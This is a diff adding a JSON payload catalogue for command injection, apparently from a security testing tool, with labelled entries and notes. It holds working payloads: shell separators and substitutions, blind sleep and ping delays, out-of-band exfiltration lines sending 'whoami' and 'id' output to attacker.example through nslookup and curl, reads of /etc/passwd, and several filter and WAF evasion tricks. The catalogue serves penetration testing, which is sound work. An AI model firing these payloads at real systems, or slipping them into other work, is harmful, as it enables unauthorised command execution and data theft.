@@ -1,0 +1,146 @@
+{
+  "id": "cmdi",
+  "label": "Command Injection",
+  "entries": [
+    {
+      "id": "semicolon-id",
+      "label": "Semicolon separator (id)",
+      "payload": ";id",
+      "notes": "Semicolon ends the intended command and runs id; benign output proves execution on Unix shells.",
+      "tags": ["separator", "linux", "canonical"]
+    },
+    {
+      "id": "pipe-id",
+      "label": "Pipe into command",
+      "payload": "| id",
+      "notes": "Pipes the first command's output into id; fires regardless of the first command's exit status.",
+      "tags": ["separator", "linux"]
+    },
+    {
+      "id": "and-id",
+      "label": "Conditional AND (&&)",
+      "payload": "&& id",
+      "notes": "Runs id only when the preceding command succeeds; survives inputs that must stay syntactically valid.",
+      "tags": ["separator", "linux"]
+    },
+    {
+      "id": "or-id",
+      "label": "Conditional OR (||)",
+      "payload": "|| id",
+      "notes": "Runs id when the preceding command fails; useful when tampered input makes the legitimate command error.",
+      "tags": ["separator", "linux"]
+    },
+    {
+      "id": "background-amp",
+      "label": "Background/chain ampersand",
+      "payload": "& id",
+      "notes": "On cmd.exe a single ampersand chains unconditionally; on Unix it backgrounds the first command so both still run — handy for blind injection where the original must not block.",
+      "tags": ["separator", "windows", "linux"]
+    },
+    {
+      "id": "newline-id",
+      "label": "Encoded newline separator",
+      "payload": "%0aid",
+      "notes": "URL-encoded line feed injects a fresh command line where the shell splits on newlines.",
+      "tags": ["separator", "encoding", "linux"]
+    },
+    {
+      "id": "dollar-subshell",
+      "label": "Command substitution $()",
+      "payload": "$(id)",
+      "notes": "POSIX substitution executes inline and embeds output in the surrounding argument; nests cleanly.",
+      "tags": ["subshell", "linux", "canonical"]
+    },
+    {
+      "id": "backtick-subshell",
+      "label": "Backtick substitution",
+      "payload": "`id`",
+      "notes": "Legacy backtick substitution; fallback when $() is filtered.",
+      "tags": ["subshell", "linux"]
+    },
+    {
+      "id": "blind-sleep",
+      "label": "Blind time delay (sleep)",
+      "payload": ";sleep 5",
+      "notes": "No output channel required: a measurable five-second delay confirms blind injection on Unix.",
+      "tags": ["blind", "time-based", "linux"]
+    },
+    {
+      "id": "blind-ping-win",
+      "label": "Blind delay via ping (Windows)",
+      "payload": "& ping -n 5 127.0.0.1",
+      "notes": "Ping count introduces a timed delay on Windows where command output is not reflected.",
+      "tags": ["blind", "time-based", "windows"]
+    },
+    {
+      "id": "oob-dns",
+      "label": "Out-of-band DNS exfil",
+      "payload": ";nslookup $(whoami).attacker.example",
+      "notes": "Resolves a subdomain carrying command output; observable on a controlled nameserver when no in-band channel exists.",
+      "tags": ["oob", "dns-exfil", "blind"]
+    },
+    {
+      "id": "oob-http",
+      "label": "Out-of-band HTTP callback",
+      "payload": ";curl http://attacker.example/$(id|base64)",
+      "notes": "Sends base64 output over HTTP; works when DNS is filtered but outbound HTTP is allowed.",
+      "tags": ["oob", "http-exfil", "linux"]
+    },
+    {
+      "id": "ifs-space-bypass",
+      "label": "Space bypass with ${IFS}",
+      "payload": ";cat${IFS}/etc/passwd",
+      "notes": "${IFS} expands to whitespace, defeating filters that block literal spaces.",
+      "tags": ["space-bypass", "linux"]
+    },
+    {
+      "id": "brace-space-bypass",
+      "label": "Space bypass with brace expansion",
+      "payload": "{cat,/etc/passwd}",
+      "notes": "Brace expansion passes arguments without spaces; slips past naive space blocklists.",
+      "tags": ["space-bypass", "linux"]
+    },
+    {
+      "id": "quote-break-id",
+      "label": "Break quoted argument",
+      "payload": "';id;'",
+      "notes": "Closes a single-quoted shell argument, injects id, then reopens the quote to keep syntax valid.",
+      "tags": ["separator", "linux"]
+    },
+    {
+      "id": "windows-whoami",
+      "label": "Windows chain (whoami)",
+      "payload": "& whoami",
+      "notes": "cmd.exe command chaining; whoami is a side-effect-free execution proof on Windows.",
+      "tags": ["windows", "canonical"]
+    },
+    {
+      "id": "powershell-getprocess",
+      "label": "PowerShell statement separator",
+      "payload": "; Get-Process",
+      "notes": "Semicolon separates PowerShell statements; Get-Process proves execution without changes.",
+      "tags": ["powershell", "windows"]
+    },
+    {
+      "id": "argument-injection",
+      "label": "Argument injection (output flag)",
+      "payload": "-o/tmp/out http://attacker.example",
+      "notes": "When input becomes argv to a tool like curl/wget, inject flags rather than shell metacharacters.",
+      "tags": ["argument-injection"]
+    },
+    {
+      "id": "waf-quote-concat",
+      "label": "Keyword split via quotes",
+      "payload": ";c''at /etc/passwd",
+      "notes": "Empty-string concatenation breaks the keyword for signature WAFs; the shell reassembles cat.",
+      "tags": ["waf-bypass", "linux"]
+    },
+    {
+      "id": "waf-glob-binary",
+      "label": "Glob the binary name",
+      "payload": ";/bin/c?t /etc/passwd",
+      "notes": "Single-character glob matches /bin/cat, evading literal cat filters.",
+      "tags": ["waf-bypass", "linux"]
+    }
+  ]
+}
